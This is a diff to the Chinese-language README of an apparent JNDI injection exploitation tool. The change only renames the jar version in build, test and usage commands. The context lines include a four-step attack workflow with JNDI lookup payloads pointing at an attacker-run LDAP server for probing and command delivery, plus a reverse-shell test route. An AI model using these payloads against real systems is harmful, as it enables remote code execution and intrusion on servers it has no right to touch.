@@ -14,19 +14,19 @@ cd JNDIEXP-main
 mvn package -DskipTests
 ```
 
-产出：`target/JNDIInject-1.3-SNAPSHOT.jar`（约 54MB，包含全部 gadget 依赖）
+产出：`target/JNDIInject-1.4.jar`（约 54MB，包含全部 gadget 依赖）
 
 ## 快速开始
 
 ```bash
 # 启动 LDAP + HTTP 服务
-java -jar JNDIInject-1.3-SNAPSHOT.jar -i <your-ip>
+java -jar JNDIInject-1.4.jar -i <your-ip>
 
 # 验证路由（不启动服务）
-java -jar JNDIInject-1.3-SNAPSHOT.jar -i <your-ip> --dry-run
+java -jar JNDIInject-1.4.jar -i <your-ip> --dry-run
 
 # 查看完整用法
-java -jar JNDIInject-1.3-SNAPSHOT.jar -u
+java -jar JNDIInject-1.4.jar -u
 ```
 
 ## 命令行参数
@@ -226,16 +226,16 @@ Java `ObjectInputStream` 使用 Modified UTF-8（允许 overlong），标准 UTF
 mvn test
 
 # dry-run 路由验证
-java -jar target/JNDIInject-1.3-SNAPSHOT.jar -i 127.0.0.1 --dry-run
+java -jar target/JNDIInject-1.4.jar -i 127.0.0.1 --dry-run
 
 # 指定路由验证
-java -jar target/JNDIInject-1.3-SNAPSHOT.jar -i 127.0.0.1 --dry-run \
+java -jar target/JNDIInject-1.4.jar -i 127.0.0.1 --dry-run \
   --test-routes "basic/base64/d2hvYW1p,EL/reverseshell/127.0.0.1/4444"
 ```
 
 ## 使用流程
 
-1. VPS 启动工具：`java -jar JNDIInject-1.3-SNAPSHOT.jar -i <vps-ip>`
+1. VPS 启动工具：`java -jar JNDIInject-1.4.jar -i <vps-ip>`
 2. 探测目标依赖：`${jndi:ldap://<vps-ip>:1389/fuzzbyDNS/<dnslog>}`
 3. 根据 DNS 结果选择可用链路
 4. 投递 payload：`${jndi:ldap://<vps-ip>:1389/<chain>/<cmd>}`
